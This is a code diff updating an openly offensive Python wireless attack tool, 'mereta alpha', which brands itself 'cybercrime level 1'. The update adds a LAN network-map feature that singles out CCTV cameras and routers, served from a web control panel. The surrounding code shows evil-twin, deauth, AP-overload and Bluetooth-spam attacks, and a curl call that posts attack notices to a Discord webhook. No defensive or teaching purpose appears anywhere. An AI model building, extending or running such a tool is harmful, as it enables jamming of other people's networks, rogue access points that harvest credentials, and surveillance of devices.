@@ -1,8 +1,8 @@
+```python
 #!/usr/bin/env python3
 """
-mereta alpha v4.0 - cybercrime level 1
-full features: mac changer | auto save | attack log | signal meter | evil twin | device tracker | bt scanner | bt spam | export log
-attack menu dipisah: deauth | all channels | ap overload | bt brutal
+mereta alpha v4.1 - cybercrime level 1
+full features + network map visual tree
 minimalist ui - putih merah - font kurus
 """
 
@@ -51,6 +51,84 @@ def send_discord(title, desc, color=0xcc0000):
         subprocess.run(["curl", "-H", "Content-Type: application/json", "-X", "POST", "-d", json.dumps(data), discord_webhook], capture_output=True)
     except:
         pass
+
+# ============================================
+# network map (visual tree)
+# ============================================
+
+def get_network_map():
+    """generate network map visual tree"""
+    devices = device_scan()
+    gateway = get_gateway()
+    my_ip = get_ip()
+    
+    if not devices:
+        return "no devices found"
+    
+    # cari router/gateway
+    router = None
+    for d in devices:
+        if d.get('ip') == gateway:
+            router = d
+            break
+    if not router:
+        router = {"ip": gateway, "type": "router"}
+    
+    # bangun tree
+    tree = f"┌─────────────┐\n"
+    tree += f"│   {router['ip']:<10} │\n"
+    tree += f"│   ({router['type']})│\n"
+    tree += f"└──────┬──────┘\n"
+    tree += f"       │\n"
+    
+    # koneksi ke pi dan device lain
+    children = []
+    others = []
+    for d in devices:
+        if d.get('ip') == my_ip:
+            children.append(d)
+        elif d.get('ip') != gateway:
+            others.append(d)
+    
+    # pi sendiri
+    if children:
+        tree += f"   ┌──┴──┐\n"
+        for c in children:
+            tree += f"   │ {c['ip']} │\n"
+            tree += f"   │({c['type']})│\n"
+    
+    # device lain
+    if others:
+        if children:
+            tree += f"   └──┬──┘\n"
+        tree += f"      │\n"
+        tree += f"   ┌──┴──────────────────┐\n"
+        
+        for i, d in enumerate(others[:8]):
+            icon = "📹" if d.get('type') == "cctv" else "📡" if d.get('type') == "router" else "💻"
+            tree += f"   │ {icon} {d['ip']:<13} │\n"
+            tree += f"   │   ({d['type']})        │\n"
+        if len(others) > 8:
+            tree += f"   │   ... {len(others)-8} more   │\n"
+        tree += f"   └────────────────────┘\n"
+    
+    return tree
+
+def get_network_map_text():
+    """simple text version of network map"""
+    devices = device_scan()
+    gateway = get_gateway()
+    my_ip = get_ip()
+    
+    result = f"gateway: {gateway}\n"
+    result += f"my ip: {my_ip}\n"
+    result += "devices:\n"
+    
+    for d in devices[:20]:
+        icon = "📹" if d.get('type') == "cctv" else "📡" if d.get('type') == "router" else "💻"
+        result += f"  {icon} {d['ip']} - {d.get('type', 'unknown')}\n"
+    
+    return result
 
 # ============================================
 # mac changer
@@ -383,7 +461,6 @@ def device_scan():
 # ============================================
 
 def get_bssid_from_ssid(target_ssid):
-    """cari bssid dari ssid target"""
     networks = scan_wifi_networks()
     for net in networks:
         if net.get("ssid") == target_ssid:
@@ -525,7 +602,7 @@ html_page = '''<!doctype html>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>mereta alpha v4.0</title>
+<title>mereta alpha v4.1</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
 body{background:#fff;font-family:'courier new',monospace;font-weight:300;font-size:11px;color:#cc0000;padding:12px;}
@@ -547,13 +624,14 @@ button:hover{background:#cc0000;color:#fff;}
 .signal-bar{display:inline-block;width:40px;background:#eee;border:1px solid #cc0000;margin-left:5px;vertical-align:middle;}
 .signal-fill{height:6px;background:#cc0000;}
 .red{color:#cc0000;}
+pre{font-family:'courier new',monospace;font-size:8px;color:#cc0000;margin:0;white-space:pre-wrap;}
 </style>
 </head>
 <body>
 <div class="container">
 <div class="header">
-<div class="title">mereta alpha v4.0</div>
-<div class="subtitle">full features - evil twin - bt spam - tracker</div>
+<div class="title">mereta alpha v4.1</div>
+<div class="subtitle">full features + network map visual tree</div>
 </div>
 <div class="warning">[!] extreme danger - total destruction mode</div>
 
@@ -579,6 +657,13 @@ button:hover{background:#cc0000;color:#fff;}
 <select id="signalTarget"><option value="">pilih target</option></select>
 <button id="checkSignalBtn">check signal</button>
 <div id="signalResult" class="result-area"></div>
+</div>
+
+<!-- network map visual tree -->
+<div class="section">
+<div class="section-title">> network map (visual tree)</div>
+<button id="mapBtn">generate network map</button>
+<div id="mapResult" class="result-area"></div>
 </div>
 
 <!-- evil twin -->
@@ -793,6 +878,17 @@ document.getElementById('checkSignalBtn').onclick = async () => {
     document.getElementById('signalResult').innerHTML = `<div class="result-line">signal: ${signal}% <div class="signal-bar"><div class="signal-fill" style="width:${signal}%"></div></div></div>`;
 };
 
+// network map
+document.getElementById('mapBtn').onclick = async () => {
+    document.getElementById('mapResult').innerHTML = '<div class="result-line">generating map...</div>';
+    const data = await fetchJson('/api/map');
+    if(data.map) {
+        document.getElementById('mapResult').innerHTML = `<pre>${data.map}</pre>`;
+    } else {
+        document.getElementById('mapResult').innerHTML = '<div class="result-line">no devices found</div>';
+    }
+};
+
 document.getElementById('evilStartBtn').onclick = async () => {
     const ssid = document.getElementById('evilSsid').value;
     if(!ssid) return;
@@ -1005,6 +1101,9 @@ class handler(BaseHTTPRequestHandler):
             ip = self.path.split('ip=')[1] if 'ip=' in self.path else ''
             signal = get_signal_strength(ip) if ip else 0
             self.send_json({'signal': signal})
+        elif self.path == '/api/map':
+            map_tree = get_network_map()
+            self.send_json({'map': map_tree})
         elif self.path.startswith('/api/evil/start'):
             ssid = self.path.split('ssid=')[1] if 'ssid=' in self.path else 'free_wifi'
             threading.Thread(target=start_evil_twin, args=(ssid,)).start()
@@ -1092,10 +1191,11 @@ class handler(BaseHTTPRequestHandler):
 if __name__ == '__main__':
     os.system('clear')
     print('\033[91m╔════════════════════════════════════════════╗')
-    print('║              mereta alpha v4.0                ║')
+    print('║              mereta alpha v4.1                ║')
     print('║    cybercrime level 1 - full features         ║')
     print('║  mac changer | evil twin | bt spam | tracker  ║')
     print('║     attack menu: deauth | all channels | ap overload | bt brutal    ║')
+    print('║     network map: visual tree                  ║')
     print('╚════════════════════════════════════════════╝\033[0m')
     os.system(f"sudo ifconfig {interface} up 2>/dev/null")
     local_ip = get_ip()
@@ -1105,7 +1205,9 @@ if __name__ == '__main__':
     print(f'\033[91m    - all channels: pilih target wifi')
     print(f'\033[91m    - ap overload: pilih target wifi')
     print(f'\033[91m    - bluetooth brutal: start/stop terpisah')
+    print(f'\033[91m    - network map: visual tree jaringan')
     print(f'\033[91m[!]\033[0m press ctrl+c to stop\n')
     server = HTTPServer(('0.0.0.0', 8080), handler)
     try: server.serve_forever()
     except KeyboardInterrupt: print('\n\033[91m[!]\033[0m terminated'); server.shutdown()
+```
